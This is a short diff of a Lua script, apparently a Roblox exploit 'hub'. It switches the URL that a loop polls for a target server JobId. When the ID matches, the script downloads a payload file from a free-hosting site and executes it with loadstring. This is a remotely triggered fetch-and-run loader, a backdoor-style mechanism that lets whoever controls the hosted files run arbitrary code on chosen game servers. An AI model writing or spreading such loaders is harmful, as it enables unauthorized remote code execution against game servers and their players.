@@ -37,7 +37,7 @@ local job = game.JobId
 while true do
     wait(1)
     local job = game.JobId
-    local input = game:HttpGet("https://nyx-hub.000webhostapp.com/target.lua")
+    local input = game:HttpGet("https://raw.githubusercontent.com/nixey70/my-hub/main/target")
     if input == job then
         loadstring(game:HttpGet("https://nyx-hub.000webhostapp.com/targetpackage.lua", true))()
     end
